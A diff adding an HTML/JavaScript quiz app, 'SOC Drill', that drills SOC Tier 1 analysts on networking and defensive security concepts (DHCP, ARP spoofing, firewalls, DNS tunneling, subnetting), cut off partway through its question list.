@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SOC Drill</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --paper:#EEF2F7; --surface:#FFFFFF; --ink:#1B2A41; --muted:#5B6B82; --line:#CBD5E2;
+  --amber:#C98318; --amber-soft:#FCEBCB; --ok:#22806E; --ok-soft:#D6EFE9; --bad:#B83A30; --bad-soft:#F6DCD9;
+  --block-a:#DCE4EF; --block-b:#C3D0E2; --in:#F2C46B; --mark:#1B2A41;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --paper:#0F1826; --surface:#17233A; --ink:#E6ECF5; --muted:#93A3BC; --line:#2A3A55;
+    --amber:#F0B457; --amber-soft:#3B2E14; --ok:#4FBFA8; --ok-soft:#133229; --bad:#E8756B; --bad-soft:#3A1C1A;
+    --block-a:#22314C; --block-b:#2E4062; --in:#B8862E; --mark:#E6ECF5;
+  }
+}
+:root[data-theme="dark"]{
+  --paper:#0F1826; --surface:#17233A; --ink:#E6ECF5; --muted:#93A3BC; --line:#2A3A55;
+  --amber:#F0B457; --amber-soft:#3B2E14; --ok:#4FBFA8; --ok-soft:#133229; --bad:#E8756B; --bad-soft:#3A1C1A;
+  --block-a:#22314C; --block-b:#2E4062; --in:#B8862E; --mark:#E6ECF5;
+}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*,*::before,*::after{box-sizing:border-box}
+body{
+  margin:0; background:var(--paper); color:var(--ink);
+  font-family:'Archivo',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
+  font-size:16px; line-height:1.5; -webkit-text-size-adjust:100%;
+}
+.mono{font-family:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.wrap{max-width:580px; margin:0 auto; padding:20px 16px 48px}
+header{display:flex; align-items:flex-end; justify-content:space-between; gap:12px; margin-bottom:18px}
+h1{font-size:1.75rem; font-weight:800; letter-spacing:-0.02em; line-height:1.1; margin:0}
+.sub{color:var(--muted); font-size:.9rem; margin:4px 0 0}
+.score{text-align:right; flex-shrink:0}
+.score b{display:block; font-size:1.5rem; font-weight:800; line-height:1}
+.score span{font-size:.78rem; color:var(--muted)}
+.tabs{display:grid; grid-template-columns:repeat(4,1fr); background:var(--surface); border:1px solid var(--line); border-radius:12px; padding:4px; gap:4px; margin-bottom:16px}
+.tabs button{font:inherit; font-weight:600; font-size:.95rem; border:0; background:transparent; color:var(--muted); padding:10px 4px; border-radius:9px; cursor:pointer}
+.tabs button[aria-selected="true"]{background:var(--ink); color:var(--paper)}
+button:focus-visible,.chip:focus-visible,input:focus-visible,summary:focus-visible{outline:3px solid var(--amber); outline-offset:2px}
+.panel{background:var(--surface); border:1px solid var(--line); border-radius:16px; padding:20px 18px}
+.progress{font-size:.85rem; color:var(--muted); margin:0 0 6px}
+.q{font-size:1.2rem; font-weight:700; line-height:1.35; margin:0 0 16px}
+.opts{display:grid; gap:8px}
+.opt{font:inherit; text-align:left; border:1.5px solid var(--line); background:var(--paper); color:var(--ink); border-radius:10px; padding:12px 14px; cursor:pointer; line-height:1.4}
+.opt:disabled{cursor:default}
+.opt.right{border-color:var(--ok); background:var(--ok-soft)}
+.opt.wrong{border-color:var(--bad); background:var(--bad-soft)}
+.why{margin-top:14px; padding:12px 14px; border-left:4px solid var(--amber); background:var(--amber-soft); border-radius:0 10px 10px 0; font-size:.95rem}
+.why p{margin:0}
+.why p+p{margin-top:6px}
+.primary{font:inherit; font-weight:700; width:100%; margin-top:16px; padding:14px; border:0; border-radius:12px; background:var(--ink); color:var(--paper); cursor:pointer; font-size:1rem}
+.secondary{font:inherit; font-weight:600; width:100%; margin-top:8px; padding:12px; border:1.5px solid var(--line); border-radius:12px; background:transparent; color:var(--ink); cursor:pointer}
+.prompt{font-size:1.6rem; font-weight:600; margin:2px 0 4px; word-break:break-all}
+.hint{color:var(--muted); font-size:.9rem; margin:0 0 16px}
+.field{display:grid; grid-template-columns:7.5rem 1fr; align-items:center; gap:10px; margin-bottom:10px}
+.field label{font-weight:600; font-size:.92rem}
+.inbox{display:flex; align-items:center; border:1.5px solid var(--line); border-radius:10px; background:var(--paper); overflow:hidden}
+.inbox .pre{padding:0 0 0 12px; color:var(--muted); font-size:.95rem; white-space:nowrap}
+.inbox input{font:inherit; font-family:'JetBrains Mono',ui-monospace,Menlo,monospace; font-size:1rem; border:0; background:transparent; color:var(--ink); padding:11px 12px 11px 2px; width:100%; min-width:0}
+.inbox input:focus{outline:none}
+.inbox:focus-within{border-color:var(--amber)}
+.inbox.right{border-color:var(--ok); background:var(--ok-soft)}
+.inbox.wrong{border-color:var(--bad); background:var(--bad-soft)}
+.fix{grid-column:2; font-size:.85rem; color:var(--bad); margin-top:-6px}
+.street{margin-top:18px}
+.street h3{font-size:1rem; margin:0 0 4px}
+.street .cap{font-size:.85rem; color:var(--muted); margin:0 0 10px}
+.grid{display:grid; grid-template-columns:repeat(16,1fr); gap:2px}
+.cell{aspect-ratio:1; border-radius:2px; background:var(--block-a); position:relative}
+.cell.alt{background:var(--block-b)}
+.cell.in{background:var(--in)}
+.cell.net,.cell.bc{background:var(--mark)}
+.cell.me{box-shadow:0 0 0 2px var(--bad); z-index:1}
+.legend{display:flex; flex-wrap:wrap; gap:6px 14px; font-size:.8rem; color:var(--muted); margin-top:10px}
+.legend i{display:inline-block; width:12px; height:12px; border-radius:2px; vertical-align:-1px; margin-right:5px}
+.steps{margin:16px 0 0; padding-left:1.3rem; font-size:.95rem}
+.steps li+li{margin-top:6px}
+details{margin-top:16px; border-top:1px solid var(--line); padding-top:12px}
+summary{cursor:pointer; font-weight:600; font-size:.92rem}
+table{width:100%; border-collapse:collapse; margin-top:10px; font-size:.9rem}
+th,td{text-align:left; padding:6px 4px; border-bottom:1px solid var(--line)}
+th{font-weight:600; color:var(--muted)}
+.done{text-align:center}
+.done .big{font-size:3rem; font-weight:800; line-height:1; margin:6px 0}
+.topicbox{border:1.5px solid var(--line); border-radius:12px; padding:10px 12px; margin:0 0 16px; background:var(--surface)}
+.topicbox summary{cursor:pointer; font-weight:600; font-size:.9rem; color:var(--ink)}
+.topicbox[open] summary{margin-bottom:10px}
+.topicbox .decks{margin:0 0 10px}
+.trow{display:flex; flex-wrap:wrap; gap:6px; align-items:center; margin:0 0 10px}
+.mini{font:inherit; font-size:.8rem; border:none; background:none; color:var(--muted); text-decoration:underline; cursor:pointer; padding:4px 6px}
+.chip.weakchip[aria-pressed="true"]{border-color:var(--amber); background:var(--amber); color:#1B2A41}
+.topicbox .primary:disabled{opacity:.5; cursor:not-allowed}
+.decks{display:flex; flex-wrap:wrap; gap:6px; margin:0 0 16px}
+.chip{font:inherit; font-size:.85rem; font-weight:600; border:1.5px solid var(--line); background:transparent; color:var(--muted); padding:6px 12px; border-radius:999px; cursor:pointer}
+.chip span{font-weight:400; opacity:.75}
+.chip[aria-pressed="true"]{border-color:var(--ink); background:var(--ink); color:var(--paper)}
+.tag{display:inline-block; margin-left:6px; padding:1px 8px; border-radius:999px; background:var(--amber-soft); color:var(--ink); font-size:.75rem; font-weight:600}
+.tabs button{font-size:.9rem}
+footer{margin-top:20px; text-align:center}
+footer button{font:inherit; font-size:.85rem; background:none; border:0; color:var(--muted); text-decoration:underline; cursor:pointer}
+@media (max-width:380px){ .field{grid-template-columns:6.4rem 1fr} .prompt{font-size:1.35rem} }
+@media (prefers-reduced-motion:no-preference){ .opt,.inbox{transition:border-color .15s, background .15s} }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div>
+      <h1>SOC Drill</h1>
+      <p class="sub">SOC Tier 1 · pick topics and drill</p>
+    </div>
+    <div class="score" aria-live="polite"><b id="scoreNum">0/0</b><span id="scoreLbl">streak 0</span></div>
+  </header>
+
+  <nav class="tabs" role="tablist">
+    <button role="tab" data-mode="concepts" aria-selected="true">Concepts</button>
+    <button role="tab" data-mode="subnets" aria-selected="false">Subnets</button>
+    <button role="tab" data-mode="masks" aria-selected="false">Masks</button>
+    <button role="tab" data-mode="ports" aria-selected="false">Ports</button>
+  </nav>
+
+  <main id="view" class="panel"></main>
+
+  <footer><button id="reset">Reset my scores</button></footer>
+</div>
+
+<script>
+(function(){
+  var KEY='socdrill-day1';
+  function fresh(){return {concepts:{r:0,t:0},subnets:{r:0,t:0},masks:{r:0,t:0},ports:{r:0,t:0},streak:0}}
+  function load(){try{var s=JSON.parse(localStorage.getItem(KEY)); if(s&&s.concepts&&s.subnets&&s.masks){if(!s.ports)s.ports={r:0,t:0}; return s;}}catch(e){} return fresh()}
+  function save(){try{localStorage.setItem(KEY,JSON.stringify(stats))}catch(e){}}
+  var stats=load();
+  var mode='concepts';
+  var view=document.getElementById('view');
+
+  function rnd(n){return Math.floor(Math.random()*n)}
+  function shuffle(a){a=a.slice();for(var i=a.length-1;i>0;i--){var j=rnd(i+1);var t=a[i];a[i]=a[j];a[j]=t}return a}
+  function esc(s){return String(s).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})}
+
+  function record(ok){
+    stats[mode].t++; if(ok){stats[mode].r++; stats.streak++} else stats.streak=0;
+    save(); paintScore();
+  }
+  function paintScore(){
+    var s=stats[mode];
+    document.getElementById('scoreNum').textContent=s.r+'/'+s.t;
+    document.getElementById('scoreLbl').textContent='streak '+stats.streak;
+  }
+
+  var MASK={24:0,25:128,26:192,27:224,28:240,29:248,30:252};
+  var TABLE='<details><summary>Show the cheat table</summary><table><thead><tr><th>CIDR</th><th>Mask (last octet)</th><th>Block</th><th>Usable</th></tr></thead><tbody>'+
+    [24,25,26,27,28,29,30].map(function(p){var b=Math.pow(2,32-p);return '<tr><td class="mono">/'+p+'</td><td class="mono">.'+MASK[p]+'</td><td>'+b+'</td><td>'+(b-2)+'</td></tr>'}).join('')+
+    '</tbody></table></details>';
+
+  /* ---------------- Concepts ---------------- */
+  var QS=[
+    {q:'Which of these is a private IP address?',a:['172.20.4.1','172.32.5.10','192.169.1.1','11.0.0.1'],why:'Private ranges are 10.0.0.0/8, 172.16.0.0/12 (172.16 to 172.31) and 192.168.0.0/16. 172.32 is just outside the 172 range.'},
+    {q:'What is the APIPA range?',a:['169.254.0.0/16','127.0.0.0/8','192.168.0.0/16','10.0.0.0/8'],why:'APIPA uses 169.254.0.0/16. 127.0.0.0/8 is loopback.'},
+    {q:'A user has IP 169.254.12.7 and no internet. What happened?',a:['The host could not reach a DHCP server and self-assigned an address','A rogue DHCP server gave it a fake address','The DHCP server assigned it a public IP','NAT failed at the firewall'],why:'APIPA means the host gave itself a link-local address because DHCP did not answer. No gateway, so no internet.',more:'First ask: one user or many? One points to cable, port or VLAN. Many points to the DHCP server, an exhausted scope, or starvation.'},
+    {q:'What is the correct DHCP order?',a:['Discover, Offer, Request, Acknowledge','Discover, Request, Offer, Acknowledge','Offer, Discover, Request, Acknowledge','Request, Offer, Discover, Acknowledge'],why:'DORA: the client discovers, the server offers, the client requests, the server acknowledges.'},
+    {q:'Why is the DHCP Request sent as a broadcast?',a:['To tell every DHCP server which offer was chosen, so the others withdraw theirs','To check that nobody else is using the IP','Because the switch blocks unicast DHCP','To reach the default gateway'],why:'Several servers may have sent offers. The broadcast Request tells all of them which one was accepted.',more:'The duplicate check is a different mechanism: the server may ping first, and the client sends an ARP probe after the Ack.'},
+    {q:'Which ports does DHCP use?',a:['UDP 67 (server) and 68 (client)','TCP 67 and 68','UDP 53','TCP 80 and 443'],why:'DHCP runs over UDP. The server listens on 67 and the client on 68.'},
+    {q:'Many hosts suddenly have APIPA addresses, and the SIEM shows a flood of DHCP Discover messages from random MACs. Likely cause?',a:['DHCP starvation attack','ARP spoofing','IP spoofing','A rogue DHCP server'],why:'Starvation floods fake Discover requests until the address pool is exhausted, so real clients fall back to APIPA.'},
+    {q:'What is the main goal of a rogue DHCP server?',a:['Hand out a fake gateway or DNS to get a man-in-the-middle position','Exhaust the DHCP pool','Forge source IPs for a DoS attack','Crack Kerberos tickets'],why:'Clients that accept the rogue lease send their traffic to the attacker\u2019s gateway or DNS.'},
+    {q:'On an untrusted port, what does DHCP snooping drop?',a:['DHCP server messages (Offer and Ack)','DHCP client messages (Discover and Request)','All ARP traffic','All broadcast traffic'],why:'User ports should never send server messages, so Offers and Acks arriving there are dropped. That blocks rogue servers.'},
+    {q:'Dynamic ARP Inspection checks ARP replies against what?',a:['The DHCP snooping binding table','The routing table','The firewall logs','The DNS cache'],why:'DAI uses the IP-to-MAC bindings that DHCP snooping recorded, and drops replies that don\u2019t match.'},
+    {q:'What does ARP do?',a:['Maps an IP address to a MAC address on the local network','Maps a domain name to an IP address','Assigns IP addresses to hosts','Translates private IPs to public ones'],why:'ARP asks "who has this IP?" and learns the MAC. DNS maps names to IPs, DHCP assigns IPs, NAT translates them.'},
+    {q:'Several users\u2019 ARP caches suddenly show a different MAC for the gateway. Most likely attack?',a:['ARP spoofing (ARP poisoning)','DHCP starvation','IP spoofing','Kerberoasting'],why:'The attacker sent fake ARP replies claiming the gateway\u2019s IP, so traffic now flows through them. That\u2019s a man-in-the-middle position.'},
+    {q:'You found the attacker\u2019s MAC in a poisoned ARP cache. Best next step?',a:['Look it up in the switch\u2019s MAC address table to find the port, then isolate it','Block the gateway\u2019s IP on the firewall','Restart the DHCP server','Change every user\u2019s password'],why:'The MAC address table tells you which physical switch port the attacker is on, so you can isolate and escalate.'},
+    {q:'What are static ARP entries?',a:['Manually set IP-to-MAC entries that ARP replies can\u2019t overwrite','Entries that block all ARP traffic','A switch feature that drops gratuitous ARP','DHCP reservations'],why:'Because they\u2019re fixed, a spoofed reply can\u2019t change them. Useful for critical hosts like the gateway.'},
+    {q:'What is IP spoofing mostly used for?',a:['DoS and reflection/amplification attacks','Full interactive sessions with the target','Stealing Kerberos tickets','Poisoning ARP caches'],why:'Replies go to the forged IP, so the attacker rarely sees them. That makes spoofing ideal for floods and reflection attacks.'},
+    {q:'Your internet-facing firewall sees inbound traffic with source 10.4.4.4. What does that suggest?',a:['The source is spoofed, since private IPs can\u2019t come from the internet','Normal VPN traffic','A misconfigured DHCP scope','ARP spoofing on the LAN'],why:'Private addresses aren\u2019t routable on the internet, so a private source arriving from outside is forged.'},
+    {q:'Best defense against spoofed source IPs at the network edge?',a:['Ingress and egress filtering (BCP 38)','DHCP snooping','Static ARP entries','TLS everywhere'],why:'Edge routers drop packets whose source IP is impossible for the direction they arrive from. uRPF does a similar check.'},
+    {q:'On an internal network, what kind of IP does DHCP usually hand out?',a:['Private, then NAT translates it to public at the edge','Public, straight from the ISP','APIPA','Loopback'],why:'Internal hosts get private IPs. The router\u2019s NAT translates them to the public IP when traffic leaves.'},
+    {q:'Hosts on two different subnets need to talk. What do they need?',a:['A router (layer 3 device / default gateway)','A switch on the same VLAN','A DHCP server','An ARP entry for each other'],why:'Traffic between subnets must be routed. That also means it can be filtered and logged on the way.'},
+    {q:'Why is lateral movement inside one subnet harder to spot?',a:['Same-subnet traffic doesn\u2019t pass through the router or firewall','Switches encrypt local traffic','DHCP hides the hosts','ARP blocks logging'],why:'Hosts on the same subnet talk directly through the switch, so the firewall never sees or logs that traffic.'},
+    {q:'What is a /30 commonly used for?',a:['Point-to-point links between two routers','Large office networks','Guest Wi-Fi','Loopback interfaces'],why:'A /30 gives exactly 2 usable IPs, one for each side of the link, so nothing is wasted.'}
+  ];
+  var QS2=[
+    {q:'Which OSI layer does a switch mainly work at?',a:['Layer 2, Data Link (MAC addresses)','Layer 3, Network (IP addresses)','Layer 4, Transport','Layer 7, Application'],why:'Switches forward frames by MAC address. Routers work at layer 3 with IP addresses.',more:'Layer 3 switches also exist and can route between VLANs.'},
+    {q:'What is the data unit at layer 4?',a:['Segment','Packet','Frame','Bits'],why:'L4 segment, L3 packet, L2 frame, L1 bits.'},
+    {q:'ARP spoofing happens at which layer, so a normal firewall won\u2019t see it?',a:['Layer 2','Layer 3','Layer 4','Layer 7'],why:'ARP lives on the local segment at layer 2. You need switch features like Dynamic ARP Inspection.'},
+    {q:'SQL injection and XSS are attacks at which layer?',a:['Layer 7, Application','Layer 4, Transport','Layer 3, Network','Layer 2, Data Link'],why:'They live in the application payload, which is why a WAF (layer 7) is needed to catch them.'},
+    {q:'In a SYN flood, what does the server wait for that never arrives?',a:['The final ACK','A FIN','An RST','A second SYN'],why:'Client sends SYN, server replies SYN-ACK and waits for the ACK. Half-open connections fill the queue.',more:'FIN closes a connection. It has nothing to do with the handshake.'},
+    {q:'Best-known defense against a SYN flood?',a:['SYN cookies','Blocking the source IPs','DHCP snooping','Closing port 443'],why:'With SYN cookies the server stores no state until the final ACK arrives, so the queue can\u2019t fill up.',more:'Blocking IPs is weak here because SYN flood sources are usually spoofed.'},
+    {q:'Why does DNS normally use UDP?',a:['Queries are tiny one-question, one-answer exchanges, so a handshake adds overhead for nothing','UDP is encrypted','UDP guarantees delivery','Firewalls block TCP 53'],why:'Speed and low overhead. If a reply is lost, the client simply asks again.'},
+    {q:'When does DNS switch to TCP?',a:['Large responses and zone transfers (AXFR)','Every query from Windows hosts','When the user opens a website over HTTPS','Never, DNS is UDP only'],why:'Big replies that don\u2019t fit in UDP, and zone transfers between DNS servers, use TCP 53.'},
+    {q:'What is a DNS amplification attack?',a:['Small spoofed UDP queries make DNS servers send huge replies to the victim','Flooding a DNS server with SYN packets','Hiding data inside DNS subdomains','Poisoning the DNS cache with fake records'],why:'UDP is easy to spoof. The attacker forges the victim\u2019s IP, and the large replies flood the victim.'},
+    {q:'An Nmap SYN scan (-sS) gets SYN-ACK back. What does it send next?',a:['RST, so the handshake never completes','ACK, to finish the handshake','FIN, to close politely','Nothing, it waits for a timeout'],why:'That\u2019s why it\u2019s called a half-open scan. SYN-ACK means open, RST back from the target means closed.'},
+    {q:'A firewall allows 443. Why can an attack still get through?',a:['A traditional firewall checks only IP and port, while the attack sits in the encrypted L7 payload','Port 443 is always unfiltered by design','HTTPS disables logging','Attackers can change the port number in flight'],why:'Port 443 open means the traffic passes. SQLi, XSS or C2 inside HTTPS needs a WAF, NGFW with TLS inspection, or EDR.'},
+    {q:'What does a stateful firewall know that a stateless one doesn\u2019t?',a:['Whether a packet belongs to an existing connection','The application inside the traffic','Which user sent the traffic','The content of encrypted traffic'],why:'It tracks connection state, so replies to allowed outbound connections are let back in automatically.'},
+    {q:'What makes a firewall "next-generation" (NGFW)?',a:['App and user awareness, built-in IPS, TLS inspection, threat intel','It runs in the cloud','It only uses stateless rules','It replaces the switch'],why:'An NGFW looks inside the traffic up to layer 7, not just at IP and port.',more:'Vendors: Palo Alto, Fortinet, and Check Point (Israeli).'},
+    {q:'Rule 1 is ALLOW ANY ANY, followed by 50 deny rules. What\u2019s the problem?',a:['First match wins, so every deny rule below is shadowed and never reached','Deny rules must always come first alphabetically','The firewall will reject the config','Nothing, deny rules override allow rules'],why:'Rules are read top to bottom. Put specific rules first and DENY ANY ANY last.'},
+    {q:'What is implicit deny?',a:['Anything not explicitly allowed is blocked at the end of the rule list','The firewall blocks all inbound traffic by default and allows all outbound','A rule that denies admins','Blocking traffic from private IPs'],why:'It\u2019s the invisible last rule. Default-deny is the safe posture.'},
+    {q:'Why does egress (outbound) filtering matter?',a:['It stops C2 callbacks and data exfiltration','It blocks inbound scans','It speeds up the network','It replaces antivirus'],why:'Most companies filter inbound well and outbound badly. Malware has to call out, and egress filtering catches that.'},
+    {q:'What is a DMZ?',a:['A separate zone for public-facing servers, between the internet and the internal LAN','The internal network where employees work','A VPN for remote users','A zone with no firewall at all'],why:'Like a building lobby: the public can reach it, but not the offices behind it. It limits the blast radius.'},
+    {q:'A hacked DMZ web server tries to connect to the domain controller. What should you check first?',a:['Firewall logs: was the connection blocked or allowed?','Whether the DC needs a reboot','The web server\u2019s CPU usage','Whether DHCP is working'],why:'If it got through, severity jumps massively. The attacker is pivoting toward the keys to the kingdom.'},
+    {q:'IDS vs. IPS: which one sits inline?',a:['IPS, so it can block, but if it fails it can take down traffic','IDS, so it can alert faster','Both','Neither, both receive copies'],why:'An IPS sits in the path of the traffic. An IDS sits out-of-band and only alerts.'},
+    {q:'How does an out-of-band IDS get its copy of the traffic?',a:['A SPAN port (switch mirroring) or a network TAP','It sits inline and forwards packets','From the DNS server','From endpoint antivirus'],why:'SPAN is a switch setting (cheap, may drop packets under load). A TAP is a hardware device on the cable (copies 100%).'},
+    {q:'Why not put IPS everywhere?',a:['False positives would block legitimate users and hurt availability','IPS can\u2019t read TCP','IPS only works in the cloud','It\u2019s illegal in most countries'],why:'An IPS false positive blocks a real customer. An IDS false positive just creates an alert to review.'},
+    {q:'Which port is RDP?',a:['3389','445','22','88'],why:'RDP (Remote Desktop Protocol) is TCP 3389. 445 is SMB, 22 SSH, 88 Kerberos.'}
+  ];
+  var QSW=[
+    {q:'Thousands of DNS queries like aGVsbG8.x7k-cdn.net come from one workstation. What do you isolate?',a:['The workstation','The company DNS server','The firewall','The domain controller'],why:'The workstation is infected. The DNS server is innocent and just relays queries, and isolating it breaks DNS for everyone.',tag:'Contain the right thing'},
+    {q:'Long random subdomains, huge query volume to one domain, many TXT records. What is this?',a:['DNS tunneling','A zone transfer','DNS amplification','Normal CDN traffic'],why:'Data or commands are encoded into the subdomains. Useful for exfiltration and C2 because DNS is almost always allowed out.',more:'Those strings are often Base64. aGVsbG8gd29ybGQ decodes to "hello world".'},
+    {q:'For that DNS tunneling case, what\u2019s the main indicator to look up and block?',a:['The domain, and how recently it was registered','The DNS server\u2019s IP','The user\u2019s password','Port 53 on all hosts'],why:'Check the domain\u2019s reputation and age, then block it at the DNS server or proxy.'},
+    {q:'What is a zone transfer (AXFR)?',a:['A DNS server copying its entire record list to another DNS server','A DHCP server handing out a new scope','Moving a server into the DMZ','Encrypting DNS traffic'],why:'Normally used to sync backup DNS servers, over TCP 53. If anyone can request it, an attacker gets a map of your whole domain.',more:'Fix: allow transfers only to your own DNS servers\u2019 IPs.'},
+    {q:'An external IP requests a zone transfer from your DNS server. What does it suggest?',a:['Reconnaissance','DNS tunneling','A DHCP starvation attack','A normal update'],why:'The attacker wants the full list of hostnames, including hidden ones like test servers.'},
+    {q:'Which Windows Event IDs show a failed and a successful logon?',a:['4625 failed, 4624 successful','4624 failed, 4625 successful','4720 failed, 4722 successful','1102 failed, 4688 successful'],why:'Many 4625s followed by a 4624 from the same source is the classic brute-force-then-success pattern.'},
+    {q:'2,400 failed RDP logins, then a successful 4624 for "backup" from the same external IP. What matters most?',a:['The attacker is already inside: disable the account, isolate the server, investigate what they did','Block the IP and close the ticket','Wait to see if it happens again','Reset the firewall'],why:'Blocking the IP doesn\u2019t remove someone already logged in, and they can switch IPs.',tag:'IP blocking is a side step'},
+    {q:'Root cause fix for that RDP compromise?',a:['Never expose RDP to the internet: VPN, MFA, account lockout','Change RDP to port 3390','Install a bigger firewall','Turn off logging'],why:'Exposed RDP is one of the top ransomware entry points. Moving the port only hides it from lazy scans.'},
+    {q:'A workstation connects to 20 internal hosts on port 445 in one minute. Best label?',a:['Lateral movement over SMB, like ransomware or a worm spreading','C2 traffic','DNS tunneling','Normal backup traffic, ignore it'],why:'C2 is outbound to the attacker\u2019s server. This is internal SMB spreading, like WannaCry with EternalBlue.'},
+    {q:'For that SMB spreading host, what\u2019s the best containment?',a:['Isolate that one host with EDR','Close port 445 on the whole network','Shut down all file servers','Block the host\u2019s IP at the internet firewall'],why:'Isolate the compromised host. Closing 445 everywhere breaks file sharing for the entire company.',tag:'Contain the right thing'},
+    {q:'An alert fires. What comes first in the triage flow?',a:['Validate: which host, user, process? Is it known or approved?','Block the IP immediately','Reimage the machine','Email the whole company'],why:'Validate, enrich (VirusTotal, SIEM), contain the confirmed threat, then escalate and document.'},
+    {q:'Why is blocking the attacker\u2019s IP rarely enough on its own?',a:['Attackers spoof or rotate IPs, and may already be inside','Firewalls can\u2019t block IPs','It\u2019s illegal to block IPs','IP blocks expire after one minute'],why:'Contain the compromised host or account and block the stronger indicators (domain, hash). The IP block is a supporting step.',tag:'IP blocking is a side step'},
+    {q:'Host 10.20.30.150/26. What is the broadcast address?',a:['10.20.30.191','10.20.30.193','10.20.30.192','10.20.30.190'],why:'Block 64: networks start at 128 and 192. The broadcast is one before the next network: 191.',more:'Trick: find the next network first, then step back one.',tag:'Precision'},
+    {q:'Host 10.20.30.150/26. What is the usable range?',a:['.129 to .190','.129 to .192','.128 to .191','.130 to .191'],why:'Network .128 and broadcast .191 are not usable, leaving .129 to .190 (62 hosts).',tag:'Precision'},
+    {q:'One user has a 169.254.x.x address. What do you ask first?',a:['Is it just this user, or many users?','Is the DHCP server under attack?','What is the user\u2019s password?','Is the firewall down?'],why:'Scope first. One user points to cable, Wi-Fi, switch port or VLAN. Many points to the DHCP server or starvation.'},
+    {q:'What does exposed inbound RDP mean?',a:['Port 3389 is reachable from the internet, so anyone can try to log in','A workstation is using RDP to connect out','RDP is being used over a VPN','RDP is disabled'],why:'Attackers scan the internet for 3389 (Shodan makes it easy) and brute-force or use stolen credentials.'},
+    {q:'Which of these IPs is private?',a:['172.20.5.1','172.33.0.1','192.169.1.1','11.0.0.1'],why:'Private ranges: 10.0.0.0/8, 172.16 to 172.31, and 192.168 only. 172.33 and 192.169 are public.',tag:'Precision'},
+    {q:'Which of these IPs is public?',a:['192.169.1.1','10.200.1.1','172.31.255.1','192.168.50.1'],why:'Only 192.168.x.x is private. One digit off (192.169) and it\u2019s public.',tag:'Precision'},
+    {q:'What is the 172 private range exactly?',a:['172.16.0.0 to 172.31.255.255 (/12)','172.0.0.0 to 172.255.255.255','172.16.0.0 to 172.16.255.255 only','172.10.0.0 to 172.50.255.255'],why:'172.16.0.0/12 covers 172.16 through 172.31. Anything like 172.15 or 172.32 is public.'},
+    {q:'A PC shows the address 169.254.12.7. What does it mean?',a:['APIPA: it self-assigned because DHCP failed','It\u2019s a normal private IP from DHCP','It\u2019s a loopback address','It\u2019s a public IP'],why:'169.254.x.x is APIPA. The PC couldn\u2019t reach a DHCP server, so it gave itself an address.'},
+    {q:'What does NAT do?',a:['Swaps private IPs for the router\u2019s public IP on the way out, and back on the way in','Encrypts traffic between sites','Assigns IP addresses to clients','Blocks malicious traffic like a firewall'],why:'NAT lets many private hosts share one public IP. PAT tells them apart by port number.',more:'NAT hides internal addresses, but it is not a security control.'},
+    {q:'A SIEM alert shows malware traffic from your company\u2019s public IP. How do you find the infected machine?',a:['NAT/firewall logs (match time + source port), then DHCP logs to map the private IP to a hostname','Block the public IP','Ask the ISP','Scan every machine with antivirus'],why:'Many machines share one public IP. NAT logs give the private IP, and DHCP logs tell you which machine had it at that time.'},
+    {q:'What are the four DORA steps, in order?',a:['Discover, Offer, Request, Acknowledge','Discover, Order, Reply, Accept','Detect, Offer, Respond, Assign','Discover, Offer, Reply, Acknowledge'],why:'Client Discovers, server Offers, client Requests (broadcast), server Acknowledges.'},
+    {q:'Which DORA messages does the client broadcast?',a:['Discover and Request','Offer and Acknowledge','Only Discover','All four'],why:'Discover finds servers. Request is broadcast so the other servers know their offers weren\u2019t chosen and withdraw them.'},
+    {q:'Which ports does DHCP use?',a:['UDP 67 (server) and 68 (client)','TCP 67 and 68','UDP 53','TCP 80 and 443'],why:'DHCP runs over UDP: 67 on the server, 68 on the client.'},
+    {q:'Which feature stops a rogue DHCP server plugged into the office?',a:['DHCP snooping','DHCP spoofing','Dynamic ARP Inspection','NAT'],why:'DHCP snooping marks switch ports trusted or untrusted and drops Offers from untrusted ports. DHCP spoofing is the attack, not the defense.',tag:'Precision'},
+    {q:'DHCP snooping marks what as trusted or untrusted?',a:['Switch ports','DHCP servers by name','User accounts','IP addresses'],why:'It works per port: the port facing the real DHCP server is trusted, everything else is untrusted.',tag:'Precision'},
+    {q:'What table does DHCP snooping build?',a:['A binding table: MAC \u2194 IP \u2194 switch port','An ARP cache','A routing table','A NAT table'],why:'This binding table is what DAI and IP Source Guard use to spot fakes.'},
+    {q:'Which feature stops ARP spoofing?',a:['Dynamic ARP Inspection (DAI)','IP Source Guard','DHCP snooping alone','NAT'],why:'DAI checks ARP replies against the snooping binding table and drops fake ones.'},
+    {q:'Which feature stops IP spoofing on a switch port?',a:['IP Source Guard','Dynamic ARP Inspection','DHCP snooping alone','Port mirroring'],why:'IP Source Guard drops packets whose source IP doesn\u2019t match the binding table for that port.'},
+    {q:'What does ARP do?',a:['Finds the MAC address for a known IP on the local network','Assigns IP addresses','Translates domain names to IPs','Encrypts local traffic'],why:'Your PC knows the IP but needs the MAC to deliver the frame at layer 2. ARP broadcasts and asks.',more:'ARP has no authentication, so devices believe any reply. That\u2019s what ARP spoofing abuses.'},
+    {q:'How does ARP spoofing lead to a MITM attack?',a:['Fake ARP replies make victims send traffic to the attacker\u2019s MAC, so the attacker sits in the middle','It floods the switch so it crashes','It changes the victim\u2019s password','It blocks DNS'],why:'The victim maps the router\u2019s IP to the attacker\u2019s MAC. The attacker reads or changes traffic, then forwards it.'},
+    {q:'Which defense protects data even if an attacker gets a MITM position?',a:['TLS/HTTPS encryption','NAT','A bigger ARP cache','DHCP'],why:'Encrypted traffic is unreadable to the attacker. Add HSTS to stop SSL stripping.'},
